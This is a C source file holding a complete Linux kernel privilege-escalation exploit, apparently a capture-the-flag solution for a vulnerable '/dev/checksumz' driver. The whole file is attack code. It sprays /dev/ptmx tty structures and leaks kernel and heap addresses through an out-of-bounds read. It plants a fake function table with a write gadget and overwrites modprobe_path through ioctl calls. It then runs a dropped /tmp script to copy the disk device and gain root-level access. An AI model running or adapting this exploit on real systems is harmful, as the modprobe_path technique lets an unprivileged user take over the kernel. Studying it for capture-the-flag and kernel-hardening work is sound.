#include <sys/ioctl.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>

#define N 0x10
unsigned char buffer[0x100];

int main() {
    int ptmxfd[N];
    int fd = open("/dev/checksumz", O_RDWR);
    if (fd < 0){
        puts("error: open 2");
        exit(-1);
    }
    for (int i = 0; i < N; i++ ){
        ptmxfd[i] = open("/dev/ptmx", O_RDWR);
    	if (ptmxfd[i] < 0){
            puts("error: open 1");
            exit(-1);
    	}
    }
    /* extend buffer size */
    lseek(fd, 0x1ff, SEEK_SET);
    memset(buffer, 0x0, 0x20);
    buffer[1] = 0xff;
    buffer[2] = 0xff;
    write(fd, buffer, 0x10);

    /* leak kbase from tty_struct */
    lseek(fd, 0x418, SEEK_SET);
    read(fd, buffer, 0x30);
    unsigned long leak = ((unsigned long *)buffer)[0];
    unsigned long heap_leak = ((unsigned long *)buffer)[4];
    unsigned long state_buffer = heap_leak - 0x40 - 0x400 + 8;
    unsigned long kbase = leak - 0x1289480;
    unsigned long modprobepath = kbase + 0x1b3f100;
    //0xffffffff8105d1df: mov [rdx], ecx; ret;
    unsigned long gadget = kbase + 0x5d1df;

    printf("leak: %lx\n", leak);
    printf("kbase: %lx\n", kbase);
    printf("state_buffer: %lx\n", state_buffer);
    printf("gadget: %lx\n", gadget);

    /* create fake function table */
    lseek(fd, 0x60, SEEK_SET);
    unsigned long *ptr = ((unsigned long *)buffer);
    *ptr++ = gadget;
    *ptr++ = 0x5555666677778888;
    write(fd, buffer, 0x10);

    /* overwrite function table pointer */
    lseek(fd, 0x418, SEEK_SET);
    ptr = ((unsigned long *)buffer);
    *ptr = state_buffer;
    write(fd, buffer, 8);

    /* overwrite modprobepath */
    for (int i = 0; i < N; i++ ){
        ioctl(ptmxfd[i], 0x706d742f, modprobepath);
    }
    for (int i = 0; i < N; i++ ){
        ioctl(ptmxfd[i], 0x612f, modprobepath+4);
    }

    /* do lpe */
    system("echo '#!/bin/sh\ncp /dev/vda /flag\nchmod 777 /flag' > /tmp/a");
    system("chmod +x /tmp/a");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/b");
    system("chmod +x /tmp/b");
    system("/tmp/b");
    system("cat /flag");

    exit(0);

}
